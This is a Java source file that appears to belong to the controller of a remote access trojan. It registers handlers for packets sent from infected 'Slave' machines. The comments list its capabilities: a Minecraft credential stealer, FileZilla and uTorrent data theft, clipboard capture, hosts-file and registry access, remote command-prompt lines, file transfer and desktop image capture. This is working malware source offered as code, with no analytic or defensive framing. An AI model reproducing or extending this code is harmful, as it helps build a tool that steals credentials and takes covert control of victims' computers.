package com.redpois0n.packets;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Slave;

public class Packets {

	//private static final HashMap<String, Class<? extends AbstractPacket>> incomingPackets = new HashMap<String, Class<? extends AbstractPacket>>();
	private static final HashMap<Byte, Class<? extends AbstractPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractPacket>>();

	public static HashMap<Byte, Class<? extends AbstractPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();
		incomingPackets.put(/* "LOCALE" */(byte) 10, PacketLOCALE.class);
		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, PacketINSTLOCALES.class);
		incomingPackets.put(/* "DISCONNECT" */(byte) 12, PacketDISCONNECT.class); // disconnect
		incomingPackets.put(/* "STAT" */(byte) 13, PacketSTAT.class); // status
		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, PacketCOMPUTERNAME.class); // computername
		incomingPackets.put(/* "SERVERID" */(byte) 15, PacketSERVERID.class); // server
																				// id
		incomingPackets.put(/* "OSNAME" */(byte) 16, PacketOSNAME.class); // os
																			// name
		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, PacketIMAGECOMING.class); // image
		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, PacketSINGLEIMAGECOMING.class); // single
																									// image
		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, PacketFOLDERLIST.class); // list
																					// of
																					// folders
																					// in
																					// dir
		incomingPackets.put(/* "PROCESS" */(byte) 20, PacketPROCESS.class); // process
		incomingPackets.put(/* "CMD" */(byte) 21, PacketCMD.class); // command
																		// prompt
																		// line
		incomingPackets.put(/* "USERNAME" */(byte) 22, PacketUSERNAME.class); // username
		incomingPackets.put(/* "SERVERPATH" */(byte) 23, PacketSERVERPATH.class); // server
																					// path
		incomingPackets.put(/* "HERERAM" */(byte) 24, PacketHERERAM.class); // ram
		incomingPackets.put(/* "JAVAVER" */(byte) 25, PacketJAVAVER.class); // java
																				// version
		incomingPackets.put(/* "JAVAPATH" */(byte) 26, PacketJAVAPATH.class); // javapath
		incomingPackets.put(/* "URLSTAT" */(byte) 27, PacketURLSTAT.class); // adv
																				// downloader
																				// info
		incomingPackets.put(/* "LOCALIP" */(byte) 28, PacketLOCALIP.class); // local
																				// ip
		incomingPackets.put(/* "FILE" */(byte) 29, PacketFILE.class); // file
																		// transfer
		incomingPackets.put(/* "VERSION" */(byte) 30, PacketVERSION.class); // version
		incomingPackets.put(/* "DATE" */(byte) 31, PacketDATE.class); // date
																		// of
																		// install
		incomingPackets.put(/* "VARPROP" */(byte) 32, PacketVARPROP.class); // system
																				// env
																				// /
																				// prop
		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, PacketTHUMBNAIL.class); // tumbnail
		incomingPackets.put(/* "DIR" */(byte) 34, PacketDIR.class); // get dir
		incomingPackets.put(/* "CHAT" */(byte) 35, PacketCHAT.class); // chat
		incomingPackets.put(/* "MC" */(byte) 36, PacketMC.class); // minecraft
																	// stealer
		incomingPackets.put(/* "FF" */(byte) 37, PacketFF.class); // file
																	// finder
		incomingPackets.put(/* "HOSTF" */(byte) 38, PacketHOSTF.class); // host
																			// file
																			// text
		incomingPackets.put(/* "HOSTANSW" */(byte) 39, PacketHOSTANSW.class); // host
																				// file
																				// answer
		incomingPackets.put(/* "UTOR" */(byte) 40, PacketUTOR.class); // utorrent
																		// logs
		incomingPackets.put(/* "CBOARDC" */(byte) 41, PacketCBOARDC.class); // clipboard
																				// contents
		incomingPackets.put(/* "FC" */(byte) 42, PacketFC.class); // file
																	// preview
		incomingPackets.put(/* "IC" */(byte) 43, PacketIC.class); // image
																	// preview
		incomingPackets.put(/* "JVM" */(byte) 44, PacketJVM.class); // JVM info
		incomingPackets.put(/* "ZIP" */(byte) 45, PacketZIP.class); // zip
																		// preview
		incomingPackets.put(/* "MD5" */(byte) 46, PacketMD5.class); // file md5
		incomingPackets.put(/* "COUNTRY" */(byte) 47, PacketCOUNTRY.class); // user.country
																				// backup
		incomingPackets.put(/* "FZ" */(byte) 48, PacketFZ.class); // filezilla
		incomingPackets.put(/* "LAN" */(byte) 49, PacketLAN.class); // lan view
		incomingPackets.put(/* "IPC" */(byte) 50, PacketIPC.class); // ipconfig
		incomingPackets.put(/* "APORT" */(byte) 51, PacketAPORT.class); // active
																			// port
		incomingPackets.put(/* "WINSER" */(byte) 52, PacketWINSER.class); // windows
																			// service
																			// listing
		incomingPackets.put(/* "REGSTART" */(byte) 53, PacketREGSTART.class); // registry
																				// startup
																				// listing
		incomingPackets.put(/* "REG" */(byte) 54, PacketREG.class); // registry
																		// enter
		incomingPackets.put(/* "INSTPROG" */(byte) 55, PacketINSTPROG.class); // installed
																				// program
																				// list
		incomingPackets.put(/* "ADAPT" */(byte) 56, PacketADAPT.class); // network
																			// adapters
																			// list
		incomingPackets.put(/* "RAWINFO" */(byte) 57, PacketRAWINFO.class); // raw
																				// info
																				// listing
		incomingPackets.put(/* "SO" */(byte) 58, PacketSO.class); // sound
		incomingPackets.put(/* "IMGLIST" */(byte) 59, PacketIMGLIST.class); // thumbnail
																				// preview
		incomingPackets.put(/* "ERROR" */(byte) 60, PacketERROR.class); // error
		incomingPackets.put(/* "MONITOR" */(byte) 61, PacketMONITOR.class); // monitors
																				// listing
		incomingPackets.put(/* "DRIVES" */(byte) 62, PacketDRIVES.class); // drives
																			// listing
		incomingPackets.put(/* "RAM" */(byte) 63, PacketRAM.class); // ram
		incomingPackets.put(/* "APS" */(byte) 64, PacketAPS.class); // available
																		// processors
		incomingPackets.put(/* "ERRLOG" */(byte) 65, PacketERRLOG.class); // error
																			// log
																			// file
		incomingPackets.put(/* "CONFIG" */(byte) 66, PacketCONFIG.class); // config
																			// list
		incomingPackets.put(/* "PLUGIN" */(byte) 67, PacketPLUGIN.class); // plugin
																			// list
		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 68, PacketQUICKDESKTOP.class); // quick
																						// desktop
	}

	public static boolean execute(byte line, Slave slave) {
		try {
			AbstractPacket ac = null;
			Set<Byte> set = incomingPackets.keySet();
			for (Byte str : set) {
				if (str == line) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}
			if (ac != null) {
				/*if (line.equals("REGSTART")) {
					new PacketREGSTART().read(slave, line);
				} else if (line.equals("SO")) {
					PacketSO.handle(slave);
				} else {*/
				System.out.println(ac.getClass().getSimpleName());
					ac.read(slave, line + "");
				//}
			} else {
				System.out.println("ac is null: " + line);
			}

			// TODO PluginEventHandler.onPacket(slave, line); 
			String s;

			return ac != null;
		} catch (Exception ex) {
			Exception ex1 = new Exception("Failed to handle packet: " + line, ex);
			ex1.printStackTrace();
			return false;
		}
	}

}